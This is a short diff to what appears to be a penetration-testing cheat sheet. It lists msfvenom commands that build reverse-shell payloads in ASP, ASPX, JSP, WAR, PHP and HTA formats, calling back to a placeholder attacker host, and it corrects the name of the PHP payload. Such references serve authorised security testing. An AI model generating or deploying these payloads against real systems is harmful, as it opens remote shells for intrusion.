@@ -1796,7 +1796,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f asp > shel
 msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f aspx > shell.aspx
 msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f raw > shell.jsp
 msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f war > shell.war
-msfvenom -p php/reverse_tcp LHOST={LHOST} LPORT=4444 -f raw > shell.php
+msfvenom -p php/reverse_php LHOST={LHOST} LPORT=4444 -f raw > shell.php
 msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f hta-psh > shell.hta
 
 Framework Executable Formats [--format <value>]
